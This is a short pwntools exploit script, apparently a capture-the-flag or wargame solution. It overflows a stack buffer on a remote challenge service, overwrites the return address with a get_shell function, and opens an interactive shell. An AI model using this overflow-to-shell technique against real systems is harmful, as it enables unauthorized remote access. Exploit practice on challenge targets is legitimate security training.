from pwn import *

# Connect to the remote service
p = remote('fsi.zzado.kr', 9935)

# Receive the initial prompt until the payload input
data = p.recvuntil(b"Input your payload :")
print(data.decode())

# Construct the payload
payload = b'A' * 32           # Buffer overflow to fill the buffer
payload += b'B' * 8           # Overwrite the saved frame pointer (SFP)
payload += p64(0x00000000004011E2)
payload += p64(0x0000000000401176)  # Overwrite return address with get_shell address

# Print the payload for debugging purposes
print(payload)

# Send the payload to the remote service
p.sendline(payload)

# Interact with the remote service to maintain the connection
p.interactive()
